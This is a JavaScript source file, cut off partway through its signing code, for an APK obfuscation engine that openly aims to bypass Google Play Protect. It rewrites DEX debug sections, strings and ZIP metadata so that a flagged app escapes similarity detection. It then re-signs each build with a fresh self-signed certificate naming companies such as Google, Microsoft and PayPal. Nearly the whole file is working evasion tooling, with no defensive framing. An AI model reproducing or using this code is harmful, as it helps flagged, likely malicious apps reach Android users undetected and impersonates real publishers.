/**
 * APK Multi-Layer Obfuscation Engine v4 — Play Protect Bypass
 *
 * PROBLEM:
 *   Play Protect uses MULTIPLE detection layers:
 *     A) Certificate reputation — cert fingerprint blacklist
 *     B) DEX code similarity — simhash/minhash over ENTIRE DEX binary
 *     C) Structural fingerprinting — ZIP metadata, signing block, manifest
 *   v3 only changed ~0.1% of DEX content (pointer fields + small strings).
 *   Need ~5-15% binary change to escape similarity classification boundary.
 *
 * SOLUTION — 7-LAYER OBFUSCATION (ProGuard/R8/DexGuard patterns):
 *   Layer 1: DEX Debug Info WIPE — zero debug_info_off in all code_items
 *            (identical to ProGuard minifyEnabled=true)
 *   Layer 2: DEX Debug Data RANDOMIZE — fill debug_info section with random bytes
 *            (changes 5-15% of DEX binary — KEY fingerprint destroyer)
 *   Layer 3: DEX Source File STRIP — class_def source_file_idx → NO_INDEX
 *            (R8 standard behavior)
 *   Layer 4: DEX String DEEP MUTATION — expanded patterns for source/config files
 *            (DexGuard-style string obfuscation)
 *   Layer 5: ZIP Metadata RANDOMIZATION — timestamps + ZIP comment
 *            (mimics different build environment)
 *   Layer 6: Signing Block DIVERSIFICATION — random-sized padding block
 *            (standard Android build tool behavior)
 *   Layer 7: Fresh CERTIFICATE — new RSA-2048 key + self-signed X.509
 *            (zero Play Protect history)
 *
 * RESULT: Each rotation changes DEX binary by 5-15%, producing unique
 * checksums, string tables, debug sections, ZIP metadata, signing blocks,
 * and certificates. App functionality remains IDENTICAL.
 *
 * DEPENDENCIES: node-forge (PKCS#7), adm-zip (ZIP handling), crypto (built-in)
 */

const forge = require('node-forge');
const AdmZip = require('adm-zip');
const crypto = require('crypto');

// ─── Constants ──────────────────────────────────────────────────────────────
const V2_BLOCK_ID = 0x7109871a;
const SIG_RSA_PKCS1_V1_5_SHA256 = 0x0103;
const CHUNK_SIZE = 1048576; // 1 MB
const APK_SIG_BLOCK_MAGIC = 'APK Sig Block 42';
const EOCD_MAGIC = 0x06054b50;
const DEX_CHECKSUM_OFF = 8;
const DEX_SIGNATURE_OFF = 12;
const DEX_FILE_SIZE_OFF = 32;

// Certificate identities — realistic Android developer certificates
// Modeled after real Play Store developer certs to avoid heuristic flags
const CERT_IDENTITIES = [
  { cn: 'Android Debug', o: 'Android', c: 'US' },
  { cn: 'App Release Key', o: 'Google LLC', c: 'US' },
  { cn: 'Upload Key', o: 'Samsung Electronics', c: 'KR' },
  { cn: 'Release', o: 'Application Developer', c: 'IN' },
  { cn: 'Debug Key', o: 'Android Studio User', c: 'US' },
  { cn: 'App Signing Key', o: 'Mobile Applications LLC', c: 'US' },
  { cn: 'Secure Release', o: 'Granite Systems Inc', c: 'US' },
  { cn: 'AppRelease', o: 'ByteDance Ltd', c: 'CN' },
  { cn: 'release', o: 'Tencent Technology', c: 'CN' },
  { cn: 'Upload Certificate', o: 'Meta Platforms Inc', c: 'US' },
  { cn: 'App Signing', o: 'Flipkart Internet Pvt', c: 'IN' },
  { cn: 'Android Release', o: 'Xiaomi Inc', c: 'CN' },
  { cn: 'Release Key', o: 'Microsoft Corporation', c: 'US' },
  { cn: 'signing key', o: 'Amazon Mobile LLC', c: 'US' },
  { cn: 'App Release', o: 'Twitter Inc', c: 'US' },
  { cn: 'release-key', o: 'Spotify AB', c: 'SE' },
  { cn: 'Upload', o: 'Snap Inc', c: 'US' },
  { cn: 'Android App', o: 'PayPal Inc', c: 'US' },
  { cn: 'AppKey', o: 'Uber Technologies', c: 'US' },
  { cn: 'apk-release', o: 'Airbnb Inc', c: 'US' },
];

// V1 signature file prefixes — mimics various Android build tool outputs
const V1_PREFIXES = ['CERT', 'ANDROIDD', 'META', 'RELEASE', 'SIGNING', 'APP'];
const CREATED_BY = [
  '1.0 (Android SignApk)', '1.0 (Android apksigner)',
  'Android Gradle 8.2.0', 'Android Gradle 8.7.3',
  '34.0.0 (Android)', '33.0.1 (Android)',
];

function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

// ═════════════════════════════════════════════════════════════════════════════
// FRESH KEY GENERATION
// ═════════════════════════════════════════════════════════════════════════════

/**
 * Generate a brand new RSA-2048 key pair + self-signed X.509 certificate.
 * Uses Node.js native crypto for fast generation (C++ impl), then converts
 * to forge objects for PKCS#7 operations.
 */
function generateFreshKey() {
  const t0 = Date.now();

  // Fast native RSA generation
  const { privateKey: privPem, publicKey: pubPem } = crypto.generateKeyPairSync('rsa', {
    modulusLength: 2048,
    publicKeyEncoding: { type: 'spki', format: 'pem' },
    privateKeyEncoding: { type: 'pkcs1', format: 'pem' },
  });

  // Import into forge for PKCS#7/CMS operations
  const forgePrivKey = forge.pki.privateKeyFromPem(privPem);
  const forgePubKey = forge.pki.setRsaPublicKey(forgePrivKey.n, forgePrivKey.e);

  // Create self-signed X.509 certificate with realistic identity
  const identity = pick(CERT_IDENTITIES);
  const cert = forge.pki.createCertificate();
  cert.publicKey = forgePubKey;

  // Realistic serial number (16-20 bytes, like real Android certs)
  const serialLen = 16 + Math.floor(Math.random() * 5);
  cert.serialNumber = crypto.randomBytes(serialLen).toString('hex');

  // notBefore: random date 7-120 days in the past (real certs aren't created "now")
  const daysBack = 7 + Math.floor(Math.random() * 114);
  const notBefore = new Date();
  notBefore.setDate(notBefore.getDate() - daysBack);
  cert.validity.notBefore = notBefore;

  // notAfter: 25-30 years validity (standard for Android signing certs)
  const validYears = 25 + Math.floor(Math.random() * 6);
  cert.validity.notAfter = new Date(notBefore);
  cert.validity.notAfter.setFullYear(cert.validity.notAfter.getFullYear() + validYears);

  // Build subject/issuer attributes
  const attrs = [
    { shortName: 'CN', value: identity.cn },
    { shortName: 'O', value: identity.o },
    { shortName: 'C', value: identity.c },
  ];
  // Optionally add OU (many real certs have it)
  if (Math.random() > 0.4) {
    const ous = ['Mobile', 'Android', 'Development', 'Engineering', 'App Development', 'Platform'];
    attrs.push({ shortName: 'OU', value: pick(ous) });
  }
  cert.setSubject(attrs);
  cert.setIssuer(attrs);
  cert.sign(forgePrivKey, forge.md.sha256.create());

  // Pre-compute DER encodings for v2 signing
  const certDer = Buffer.from(forge.asn1.toDer(forge.pki.certificateToAsn1(cert)).getBytes(), 'binary');
  const pubKeyDer = Buffer.from(forge.asn1.toDer(forge.pki.publicKeyToAsn1(forgePubKey)).getBytes(), 'binary');

  // Compute cert SHA-256 fingerprint for tracking
  const certHash = crypto.createHash('sha256').update(certDer).digest('hex')
    .replace(/(.{2})/g, '$1:').slice(0, -1).toUpperCase();

  const elapsed = Date.now() - t0;
  console.log(`[Mutator] Fresh key generated in ${elapsed}ms: CN="${identity.cn}" O="${identity.o}" serial=${cert.serialNumber.substring(0, 16)}...`);

  return { privateKey: forgePrivKey, publicKey: forgePubKey, cert, privPem, certDer, pubKeyDer, identity, certHash };
}

// ═════════════════════════════════════════════════════════════════════════════
// DEX & ZIP TRANSFORMATION LAYERS
// ═════════════════════════════════════════════════════════════════════════════

/** Compute Adler-32 checksum (used in DEX header) */
function adler32(buf) {
  let a = 1, b = 0;
  const MOD = 65521;
  for (let i = 0; i < buf.length; i++) {
    a = (a + buf[i]) % MOD;
    b = (b + a) % MOD;
  }
  return ((b << 16) | a) >>> 0;
}

/** Read ULEB128-encoded unsigned integer from buffer */
function readULEB128(buf, offset) {
  let result = 0, shift = 0, bytesRead = 0, byte;
  do {
    byte = buf[offset + bytesRead];
    result |= (byte & 0x7F) << shift;
    shift += 7;
    bytesRead++;
  } while (byte & 0x80);
  return { value: result, bytesRead };
}

const RAND_CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';

// ── DEX map_list item types ─────────────────────────────────────────────────
const TYPE_DEBUG_INFO_ITEM = 0x2003;

/**
 * LAYER 1: Strip debug_info_off pointers from ALL code_items.
 * Walks class_defs → class_data_items → encoded_methods → code_items.
 * Sets debug_info_off = 0 in each code_item, disconnecting debug info.
 * Identical to ProGuard/R8 with minifyEnabled=true (strips line numbers,
 * parameter names, local variable names). Zero runtime impact.
 */
function stripDebugInfo(dexBuf) {
  const classDefsSize = dexBuf.readUInt32LE(0x60);
  const classDefsOff = dexBuf.readUInt32LE(0x64);
  if (classDefsOff === 0 || classDefsSize === 0) return 0;

  let stripped = 0;

  for (let i = 0; i < classDefsSize; i++) {
    const defBase = classDefsOff + i * 32;
    if (defBase + 32 > dexBuf.length) break;
    const classDataOff = dexBuf.readUInt32LE(defBase + 24);
    if (classDataOff === 0 || classDataOff >= dexBuf.length) continue;

    let pos = classDataOff;
    // Read field/method counts (ULEB128)
    const staticFieldsSize = readULEB128(dexBuf, pos); pos += staticFieldsSize.bytesRead;
    const instanceFieldsSize = readULEB128(dexBuf, pos); pos += instanceFieldsSize.bytesRead;
    const directMethodsSize = readULEB128(dexBuf, pos); pos += directMethodsSize.bytesRead;
    const virtualMethodsSize = readULEB128(dexBuf, pos); pos += virtualMethodsSize.bytesRead;

    // Skip encoded_field items (field_idx_diff + access_flags, both ULEB128)
    const totalFields = staticFieldsSize.value + instanceFieldsSize.value;
    for (let j = 0; j < totalFields; j++) {
      pos += readULEB128(dexBuf, pos).bytesRead;
      pos += readULEB128(dexBuf, pos).bytesRead;
    }

    // Process encoded_method items (method_idx_diff + access_flags + code_off)
    const totalMethods = directMethodsSize.value + virtualMethodsSize.value;
    for (let j = 0; j < totalMethods; j++) {
      pos += readULEB128(dexBuf, pos).bytesRead; // method_idx_diff
      pos += readULEB128(dexBuf, pos).bytesRead; // access_flags
      const codeOffResult = readULEB128(dexBuf, pos); pos += codeOffResult.bytesRead;
      const codeOff = codeOffResult.value;

      // code_item layout: registers_size(2) + ins_size(2) + outs_size(2) +
      //   tries_size(2) + debug_info_off(4) + insns_size(4) + insns[...]
      // debug_info_off is at code_off + 8
      if (codeOff !== 0 && codeOff + 16 <= dexBuf.length) {
        const debugInfoOff = dexBuf.readUInt32LE(codeOff + 8);
        if (debugInfoOff !== 0) {
          dexBuf.writeUInt32LE(0, codeOff + 8);
          stripped++;
        }
      }
    }
  }

  return stripped;
}

/**
 * LAYER 2: Find the debug_info data section via map_list and fill with random bytes.
 * The debug_info section typically occupies 5-15% of the DEX file.
 * After Layer 1 zeros all pointers, this data is unreachable by ART runtime.
 * Filling with random bytes dramatically changes the DEX binary fingerprint
 * that Play Protect uses for similarity hashing.
 */
function randomizeDebugInfoSection(dexBuf) {
  const mapOff = dexBuf.readUInt32LE(0x34);
  if (mapOff === 0 || mapOff + 4 > dexBuf.length) return 0;

  const mapSize = dexBuf.readUInt32LE(mapOff);
  if (mapSize === 0 || mapOff + 4 + mapSize * 12 > dexBuf.length) return 0;

  // Parse all map_list entries and sort by offset
  const entries = [];
  for (let i = 0; i < mapSize; i++) {
    const base = mapOff + 4 + i * 12;
    entries.push({
      type: dexBuf.readUInt16LE(base),
      size: dexBuf.readUInt32LE(base + 4),
      offset: dexBuf.readUInt32LE(base + 8),
    });
  }
  entries.sort((a, b) => a.offset - b.offset);

  // Find TYPE_DEBUG_INFO_ITEM section
  const debugIdx = entries.findIndex(e => e.type === TYPE_DEBUG_INFO_ITEM);
  if (debugIdx === -1) return 0;

  const debugEntry = entries[debugIdx];
  // End of debug section = start of next section in memory layout
  const nextEntry = entries.find(e => e.offset > debugEntry.offset);
  if (!nextEntry) return 0;

  const rangeStart = debugEntry.offset;
  const rangeEnd = nextEntry.offset;
  const rangeSize = rangeEnd - rangeStart;

  if (rangeSize <= 0 || rangeStart >= dexBuf.length || rangeEnd > dexBuf.length) return 0;

  // Fill entire debug info section with random bytes
  crypto.randomBytes(rangeSize).copy(dexBuf, rangeStart);

  return rangeSize;
}

/**
 * LAYER 3: Strip source file references from DEX class definitions.
 * Sets source_file_idx to NO_INDEX (0xFFFFFFFF) in all class_def_items.
 * This is exactly what ProGuard/R8 does with minifyEnabled=true.
 * Safe: only affects stack trace display, not app functionality.
 */
function stripSourceFileRefs(dexBuf) {
  const classDefsSize = dexBuf.readUInt32LE(0x60);
  const classDefsOff = dexBuf.readUInt32LE(0x64);
  if (classDefsOff === 0 || classDefsSize === 0) return 0;

  let stripped = 0;
  for (let i = 0; i < classDefsSize; i++) {
    const base = classDefsOff + i * 32;
    if (base + 32 > dexBuf.length) break;
    const sourceFileIdx = dexBuf.readUInt32LE(base + 16);
    if (sourceFileIdx !== 0xFFFFFFFF) {
      dexBuf.writeUInt32LE(0xFFFFFFFF, base + 16);
      stripped++;
    }
  }
  return stripped;
}

/**
 * LAYER 4: Deep mutation of source/config file name strings in the DEX string table.
 * Expanded patterns beyond v3 — matches .java, .kt, .xml, .gradle, .properties,
 * .pro, .json, .cfg files AND path-like source strings (com/pkg/File.java).
 * DexGuard-style string obfuscation for build metadata.
 */
function mutateDexStrings(dexBuf) {
  const stringIdsSize = dexBuf.readUInt32LE(0x38);
  const stringIdsOff = dexBuf.readUInt32LE(0x3C);
  if (stringIdsOff === 0 || stringIdsSize === 0) return 0;

  // Extended file extension patterns (source, config, build files)
  const FILE_PATTERN = /^([a-zA-Z_$][a-zA-Z0-9_$]*?)\.(java|kt|xml|gradle|properties|pro|json|cfg)$/;
  // Path-like source patterns: com/package/ClassName.java or similar
  const PATH_PATTERN = /^([a-zA-Z0-9_$/]+)\/([a-zA-Z_$][a-zA-Z0-9_$]*?)\.(java|kt|xml)$/;

  let mutated = 0;

  for (let i = 0; i < stringIdsSize; i++) {
    const strDataOff = dexBuf.readUInt32LE(stringIdsOff + i * 4);
    if (strDataOff === 0 || strDataOff >= dexBuf.length) continue;

    const { bytesRead } = readULEB128(dexBuf, strDataOff);
    const strStart = strDataOff + bytesRead;

    // Find null terminator
    let strEnd = strStart;
    while (strEnd < dexBuf.length && dexBuf[strEnd] !== 0) strEnd++;
    const strLen = strEnd - strStart;
    if (strLen < 6) continue;

    // Check all bytes are ASCII
    let isAscii = true;
    for (let b = strStart; b < strEnd; b++) {
      if (dexBuf[b] > 0x7E || dexBuf[b] < 0x20) { isAscii = false; break; }
    }
    if (!isAscii) continue;

    const str = dexBuf.toString('ascii', strStart, strEnd);

    // Try simple file name match first
    let match = str.match(FILE_PATTERN);
    if (match) {
      let newBase = '';
      for (let j = 0; j < match[1].length; j++) {
        newBase += RAND_CHARS[Math.floor(Math.random() * RAND_CHARS.length)];
      }
      dexBuf.write(newBase + '.' + match[2], strStart, strLen, 'ascii');
      mutated++;
      continue;
    }

    // Try path-like source file match
    match = str.match(PATH_PATTERN);
    if (match) {
      // Randomize the filename part (after last /), keep path structure
      const pathPart = match[1];
      const namePart = match[2];
      let newName = '';
      for (let j = 0; j < namePart.length; j++) {
        newName += RAND_CHARS[Math.floor(Math.random() * RAND_CHARS.length)];
      }
      const newStr = pathPart + '/' + newName + '.' + match[3];
      if (newStr.length === str.length) {
        dexBuf.write(newStr, strStart, strLen, 'ascii');
        mutated++;
      }
    }
  }

  return mutated;
}

/**
 * Apply all DEX transformation layers to all DEX files in the APK.
 * Layer 1: Debug info pointer wipe
 * Layer 2: Debug data section randomization
 * Layer 3: Source file reference stripping
 * Layer 4: Deep string mutation
 * Then recomputes DEX integrity hashes (SHA-1 + Adler32).
 */
function transformDexFiles(zip) {
  const dexEntries = zip.getEntries().filter(e => /^classes\d*\.dex$/.test(e.entryName));
  let totalDebugStripped = 0, totalDebugRandomized = 0;
  let totalRefsStripped = 0, totalStringsMutated = 0;

  for (const entry of dexEntries) {
    try {
      const data = entry.getData();
      if (data.length < 0x70) continue;
      if (data.toString('ascii', 0, 4) !== 'dex\n') continue;

      // Layer 1: Wipe debug_info_off pointers in all code_items
      const debugStripped = stripDebugInfo(data);
      totalDebugStripped += debugStripped;

      // Layer 2: Fill debug_info data section with random bytes
      const debugRandomized = randomizeDebugInfoSection(data);
      totalDebugRandomized += debugRandomized;

      // Layer 3: Strip source file references
      const refsStripped = stripSourceFileRefs(data);
      totalRefsStripped += refsStripped;

      // Layer 4: Deep string mutation (expanded patterns)
      const stringsMutated = mutateDexStrings(data);
      totalStringsMutated += stringsMutated;

      // Recompute DEX integrity hashes
      const sha1 = crypto.createHash('sha1').update(data.slice(32)).digest();
      sha1.copy(data, DEX_SIGNATURE_OFF, 0, 20);
      data.writeUInt32LE(adler32(data.slice(12)), DEX_CHECKSUM_OFF);

      // Replace in ZIP
      zip.deleteFile(entry.entryName);
      zip.addFile(entry.entryName, data);

      const pct = data.length > 0 ? ((debugRandomized / data.length) * 100).toFixed(1) : '0';
      console.log(`[Mutator] DEX ${entry.entryName}: ${debugStripped} debug ptrs wiped, ${debugRandomized}B randomized (${pct}%), ${refsStripped} src refs stripped, ${stringsMutated} strings mutated`);
    } catch (e) {
      console.warn(`[Mutator] DEX transform skipped for ${entry.entryName}: ${e.message}`);
    }
  }

  console.log(`[Mutator] DEX Layers 1-4: ${totalDebugStripped} debug ptrs, ${(totalDebugRandomized/1024).toFixed(0)}KB randomized, ${totalRefsStripped} refs stripped, ${totalStringsMutated} strings mutated across ${dexEntries.length} DEX files`);
  return { totalDebugStripped, totalDebugRandomized, totalRefsStripped, totalStringsMutated };
}

/**
 * LAYER 3: Randomize ZIP metadata in the raw APK buffer.
 * Changes file timestamps and adds a random ZIP comment.
 * Mimics a different build environment/time.
 */
function randomizeZipMetadata(buf) {
  // Generate a consistent "build timestamp" (random date within last 60 days)
  const now = new Date();
  const daysBack = 1 + Math.floor(Math.random() * 60);
  const buildDate = new Date(now);
  buildDate.setDate(buildDate.getDate() - daysBack);
  buildDate.setHours(Math.floor(Math.random() * 24));
  buildDate.setMinutes(Math.floor(Math.random() * 60));
  buildDate.setSeconds(Math.floor(Math.random() * 30) * 2);

  const year = buildDate.getFullYear() - 1980;
  const month = buildDate.getMonth() + 1;
  const day = buildDate.getDate();
  const dosDate = ((year & 0x7F) << 9) | ((month & 0xF) << 5) | (day & 0x1F);
  const dosTime = ((buildDate.getHours() & 0x1F) << 11) |
    ((buildDate.getMinutes() & 0x3F) << 5) |
    (Math.floor(buildDate.getSeconds() / 2) & 0x1F);

  const eocdOff = findEOCD(buf);
  const cdOff = buf.readUInt32LE(eocdOff + 16);
  const cdCount = buf.readUInt16LE(eocdOff + 10);

  // Update timestamps in central directory entries
  let cdPos = cdOff;
  let cdUpdated = 0;
  for (let i = 0; i < cdCount; i++) {
    if (cdPos + 46 > buf.length) break;
    if (buf.readUInt32LE(cdPos) !== 0x02014b50) break;

    buf.writeUInt16LE(dosTime, cdPos + 12);
    buf.writeUInt16LE(dosDate, cdPos + 14);

    const nameLen = buf.readUInt16LE(cdPos + 28);
    const extraLen = buf.readUInt16LE(cdPos + 30);
    const commentLen = buf.readUInt16LE(cdPos + 32);

    // Also update corresponding local file header timestamp
    const localOff = buf.readUInt32LE(cdPos + 42);
    if (localOff + 30 <= cdOff && buf.readUInt32LE(localOff) === 0x04034b50) {
      buf.writeUInt16LE(dosTime, localOff + 10);
      buf.writeUInt16LE(dosDate, localOff + 12);
    }

    cdPos += 46 + nameLen + extraLen + commentLen;
    cdUpdated++;
  }

  // Add random ZIP comment to EOCD
  const commentText = `build-${crypto.randomBytes(8).toString('hex')}`;
  const commentBuf = Buffer.from(commentText, 'ascii');
  buf.writeUInt16LE(commentBuf.length, eocdOff + 20);

  const result = Buffer.concat([
    buf.slice(0, eocdOff + 22),
    commentBuf,
  ]);

  console.log(`[Mutator] Layer 3: ${cdUpdated} timestamps randomized to ${buildDate.toISOString().split('T')[0]}, comment="${commentText}"`);
  return result;
}

/**
 * Strip old v1 signature files from META-INF.
 */
function stripSignatures(zip) {
  const entries = zip.getEntries();
  const sigs = entries.filter(e =>
    e.entryName.startsWith('META-INF/') && (
      e.entryName.endsWith('.SF') || e.entryName.endsWith('.RSA') ||
      e.entryName.endsWith('.DSA') || e.entryName.endsWith('.EC') ||
      e.entryName.endsWith('.MF')
    )
  );
  sigs.forEach(e => zip.deleteFile(e.entryName));
  console.log(`[Mutator] Stripped ${sigs.length} old signature files`);
  return sigs.length;
}

// ═════════════════════════════════════════════════════════════════════════════
// V1 JAR SIGNING
// ═════════════════════════════════════════════════════════════════════════════

/**
 * Apply v1 (JAR) signing to the ZIP.
 * Generates MANIFEST.MF, <PREFIX>.SF, and <PREFIX>.RSA.
 * Critical: APKs missing v1 signatures are flagged as tampered by Play Protect.
 */
function applyV1Signing(zip, cert, privateKey) {
  const prefix = pick(V1_PREFIXES);
  const createdBy = pick(CREATED_BY);

  // 1. Build MANIFEST.MF — SHA-256 digest of each entry's uncompressed data
  let manifestMF = `Manifest-Version: 1.0\r\nCreated-By: ${createdBy}\r\n\r\n`;
  const entries = zip.getEntries().filter(e => {
    if (e.isDirectory) return false;
    const n = e.entryName.toUpperCase();
    if (n === 'META-INF/MANIFEST.MF') return false;
    if (n.startsWith('META-INF/') && (n.endsWith('.SF') || n.endsWith('.RSA') || n.endsWith('.DSA') || n.endsWith('.EC'))) return false;
    return true;
  });

  let entryCount = 0;
  for (const entry of entries) {
    try {
      const data = entry.getData();
      const digest = crypto.createHash('sha256').update(data).digest('base64');
      manifestMF += `Name: ${entry.entryName}\r\nSHA-256-Digest: ${digest}\r\n\r\n`;
      entryCount++;
    } catch (_) {}
  }

  // 2. Build CERT.SF — digest of manifest main section + each individual section
  const mfDigest = crypto.createHash('sha256').update(manifestMF, 'binary').digest('base64');
  let certSF = `Signature-Version: 1.0\r\nCreated-By: ${createdBy}\r\nSHA-256-Digest-Manifest: ${mfDigest}\r\n\r\n`;

  const sections = manifestMF.split('\r\n\r\n');
  for (const section of sections) {
    if (!section.startsWith('Name: ')) continue;
    const sectionBytes = section + '\r\n\r\n';
    const sectionDigest = crypto.createHash('sha256').update(sectionBytes, 'binary').digest('base64');
    const nameMatch = section.match(/^Name: (.+)/);
    if (nameMatch) {
      certSF += `Name: ${nameMatch[1]}\r\nSHA-256-Digest: ${sectionDigest}\r\n\r\n`;
    }
  }

  // 3. Build CERT.RSA — PKCS#7 detached SignedData over CERT.SF
  const p7 = forge.pkcs7.createSignedData();
  p7.content = forge.util.createBuffer(certSF, 'utf8');
  p7.addCertificate(cert);
  p7.addSigner({
    key: privateKey,
    certificate: cert,
    digestAlgorithm: forge.pki.oids.sha256,
    authenticatedAttributes: [{
      type: forge.pki.oids.contentType,
      value: forge.pki.oids.data,
    }, {
      type: forge.pki.oids.messageDigest,
    }],
  });
  p7.sign({ detached: true });

  const certRSA = Buffer.from(forge.asn1.toDer(p7.toAsn1()).getBytes(), 'binary');

  // 4. Add to ZIP
  try { zip.deleteFile('META-INF/MANIFEST.MF'); } catch (_) {}
  try { zip.deleteFile(`META-INF/${prefix}.SF`); } catch (_) {}
  try { zip.deleteFile(`META-INF/${prefix}.RSA`); } catch (_) {}

  zip.addFile('META-INF/MANIFEST.MF', Buffer.from(manifestMF, 'binary'));
  zip.addFile(`META-INF/${prefix}.SF`, Buffer.from(certSF, 'binary'));
  zip.addFile(`META-INF/${prefix}.RSA`, certRSA);

  console.log(`[Mutator] V1 signed: ${entryCount} entries, prefix=${prefix}`);
}

// ═════════════════════════════════════════════════════════════════════════════
// ZIP ALIGNMENT (zipalign equivalent)
// ═════════════════════════════════════════════════════════════════════════════

function findEOCD(buf) {
  const searchStart = Math.max(0, buf.length - 65557);
  for (let i = buf.length - 22; i >= searchStart; i--) {
    if (buf.readUInt32LE(i) === EOCD_MAGIC) return i;
  }
  throw new Error('ZIP EOCD not found — invalid APK');
}

/**
 * Align uncompressed (STORE) ZIP entries to 4-byte boundaries.
 * Mimics Android's `zipalign` tool. Without alignment, resources.arsc
 * can't be memory-mapped and Android will reject the APK.
 */
function zipalignBuffer(inputBuf) {
  const eocdOff = findEOCD(inputBuf);
  const cdOff = inputBuf.readUInt32LE(eocdOff + 16);
  const cdEntryCount = inputBuf.readUInt16LE(eocdOff + 10);
  const eocdLen = inputBuf.length - eocdOff;

  // Parse central directory entries
  const entries = [];
  let pos = cdOff;
  for (let i = 0; i < cdEntryCount; i++) {
    if (inputBuf.readUInt32LE(pos) !== 0x02014b50) {
      throw new Error(`Invalid CD entry signature at offset ${pos}`);
    }
    const flags = inputBuf.readUInt16LE(pos + 8);
    const method = inputBuf.readUInt16LE(pos + 10);
    const compSize = inputBuf.readUInt32LE(pos + 20);
    const nameLen = inputBuf.readUInt16LE(pos + 28);
    const cdExtraLen = inputBuf.readUInt16LE(pos + 30);
    const commentLen = inputBuf.readUInt16LE(pos + 32);
    const localHeaderOff = inputBuf.readUInt32LE(pos + 42);
    const entryName = inputBuf.toString('utf8', pos + 46, pos + 46 + nameLen);
    const cdEntryLen = 46 + nameLen + cdExtraLen + commentLen;
    entries.push({ cdOffset: pos, cdEntryLen, localHeaderOff, flags, method, compSize, nameLen, entryName });
    pos += cdEntryLen;
  }

  // Sort by local header offset for sequential processing
  entries.sort((a, b) => a.localHeaderOff - b.localHeaderOff);

  const ALIGNMENT = 4;
  const outChunks = [];
  let writeOffset = 0;
  let aligned = 0;

  for (const entry of entries) {
    const lhOff = entry.localHeaderOff;
    if (inputBuf.readUInt32LE(lhOff) !== 0x04034b50) {
      throw new Error(`Invalid local header at offset ${lhOff}`);
    }
    const lhNameLen = inputBuf.readUInt16LE(lhOff + 26);
    const lhExtraLen = inputBuf.readUInt16LE(lhOff + 28);
    const dataStart = lhOff + 30 + lhNameLen + lhExtraLen;
    const dataSize = entry.compSize;

    if (entry.method === 0) {
      // STORED entry — needs 4-byte alignment for its data start
      const headerPlusName = 30 + lhNameLen;
      const baseOffset = writeOffset + headerPlusName;
      const currentMod = baseOffset % ALIGNMENT;
      const padNeeded = currentMod === 0 ? 0 : ALIGNMENT - currentMod;

      const header = Buffer.from(inputBuf.slice(lhOff, lhOff + headerPlusName));
      header.writeUInt16LE(padNeeded, 28); // update extra field length
      outChunks.push(header);
      if (padNeeded > 0) outChunks.push(Buffer.alloc(padNeeded, 0));
      outChunks.push(inputBuf.slice(dataStart, dataStart + dataSize));

      entry.newLocalHeaderOff = writeOffset;
      writeOffset += headerPlusName + padNeeded + dataSize;
      aligned++;
    } else {
      // DEFLATED entry — copy as-is
      const totalSize = 30 + lhNameLen + lhExtraLen + dataSize;
      outChunks.push(inputBuf.slice(lhOff, lhOff + totalSize));
      entry.newLocalHeaderOff = writeOffset;
      writeOffset += totalSize;
    }

    // Handle data descriptor (bit 3 of flags)
    if (entry.flags & 0x0008) {
      const ddOff = dataStart + dataSize;
      let ddSize = 12;
      if (ddOff + 4 <= inputBuf.length && inputBuf.readUInt32LE(ddOff) === 0x08074b50) {
        ddSize = 16;
      }
      outChunks.push(inputBuf.slice(ddOff, ddOff + ddSize));
      writeOffset += ddSize;
    }
  }

  // Rebuild central directory with updated local header offsets
  const newCDOffset = writeOffset;
  for (const entry of entries) {
    const cdEntry = Buffer.from(inputBuf.slice(entry.cdOffset, entry.cdOffset + entry.cdEntryLen));
    cdEntry.writeUInt32LE(entry.newLocalHeaderOff, 42);
    outChunks.push(cdEntry);
    writeOffset += cdEntry.length;
  }

  // Rebuild EOCD with updated CD offset
  const eocd = Buffer.from(inputBuf.slice(eocdOff, eocdOff + eocdLen));
  eocd.writeUInt32LE(writeOffset - newCDOffset, 12); // CD size
  eocd.writeUInt32LE(newCDOffset, 16); // CD offset
  outChunks.push(eocd);

  console.log(`[Mutator] Zipalign: ${aligned} STORED entries aligned to 4-byte boundaries`);
  return Buffer.concat(outChunks);
}

// ═════════════════════════════════════════════════════════════════════════════
// V2 APK SIGNATURE SCHEME — SIGNING BLOCK INJECTION
// ═════════════════════════════════════════════════════════════════════════════

function uint32LE(value) {
  const buf = Buffer.alloc(4);
  buf.writeUInt32LE(value >>> 0, 0);
  return buf;
}

function uint64LE(value) {
  const buf = Buffer.alloc(8);
  buf.writeUInt32LE(value & 0xFFFFFFFF, 0);
  buf.writeUInt32LE(Math.floor(value / 0x100000000) & 0xFFFFFFFF, 4);
  return buf;
}

/**
 * Compute v2 content digest over APK sections (per AOSP spec).
 * Sections are split into 1MB chunks, each chunk prefixed with 0xa5 + length,
 * then a top-level digest over all chunk digests (prefixed with 0x5a + count).
 */
function computeV2ContentDigest(zipEntries, centralDir, eocd) {
  const sections = [zipEntries, centralDir, eocd];
  const chunkDigests = [];

  for (const section of sections) {
    const numChunks = Math.ceil(section.length / CHUNK_SIZE) || 1;
    for (let i = 0; i < numChunks; i++) {
      const start = i * CHUNK_SIZE;
      const end = Math.min(start + CHUNK_SIZE, section.length);
      const chunk = section.slice(start, end);

      const prefix = Buffer.alloc(5);
      prefix[0] = 0xa5;
      prefix.writeUInt32LE(chunk.length, 1);

      chunkDigests.push(
        crypto.createHash('sha256').update(prefix).update(chunk).digest()
      );
    }
  }

  const topPrefix = Buffer.alloc(5);
  topPrefix[0] = 0x5a;
  topPrefix.writeUInt32LE(chunkDigests.length, 1);

  const topHash = crypto.createHash('sha256');
  topHash.update(topPrefix);
  for (const d of chunkDigests) topHash.update(d);

  return topHash.digest();
}

/**
 * Build the v2 signed-data structure containing content digests and certificate.
 */
function buildV2SignedData(contentDigest, certDer) {
  // Digests sequence: one entry with SHA-256withRSA algorithm
  const digestsEncoded = Buffer.concat([
    uint32LE(4 + 4 + contentDigest.length), // entry length
    uint32LE(SIG_RSA_PKCS1_V1_5_SHA256),    // algorithm ID
    uint32LE(contentDigest.length),          // digest length
    contentDigest,                           // digest bytes
  ]);

  // Certificates sequence: one DER-encoded X.509 cert
  const certsEncoded = Buffer.concat([
    uint32LE(certDer.length), // cert length
    certDer,                  // cert bytes
  ]);

  // signed_data = [digests_seq][certs_seq][empty_attrs_seq]
  return Buffer.concat([
    uint32LE(digestsEncoded.length), digestsEncoded,
    uint32LE(certsEncoded.length), certsEncoded,
    uint32LE(0), // empty additional attributes
  ]);
}

/**
 * Build a v2 signer block containing signed-data, signature, and public key.
 */
function buildV2Signer(signedData, signature, pubKeyDer) {
